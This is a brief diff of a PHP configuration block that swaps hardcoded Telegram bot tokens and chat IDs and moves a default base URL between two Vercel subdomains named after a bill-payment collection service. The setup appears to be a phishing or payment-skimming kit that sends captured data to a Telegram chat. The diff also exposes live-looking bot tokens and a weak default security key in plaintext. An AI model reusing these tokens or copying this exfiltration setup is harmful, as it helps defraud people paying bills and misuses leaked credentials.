@@ -4,14 +4,14 @@ error_reporting(E_ALL & ~E_NOTICE);
 ini_set('display_errors', 0);
 
 $config = require __DIR__ . '/config.php';
-$botToken = $config['botToken'] ?? '8635283514:AAFh6dwBMtmuvK5FgLgj4eyW6PV1Gciktqk';
-$chatId   = $config['chatId'] ?? '-1003796119223';
+$botToken = $config['botToken'] ?? '8666757484:AAHhvPEF0SHYMDRool4VxhCZdO-vZlNOl_Q';
+$chatId   = $config['chatId'] ?? '-5184887669';
 $secKey   = $config['security_key'] ?? 'secure_key_123';
 
 // Base URL predeterminada
 $detectedScheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'https';
-$detectedHost   = $_SERVER['HTTP_HOST'] ?? 'recaudoairepago.vercel.app';
-$defaultBaseUrl = "https://recaudoairepago.vercel.app";
+$detectedHost   = $_SERVER['HTTP_HOST'] ?? 'recaudoairefactura.vercel.app';
+$defaultBaseUrl = "https://recaudoairefactura.vercel.app";
 
 // Lista de Webhooks por Pasarela
 $webhooks = [
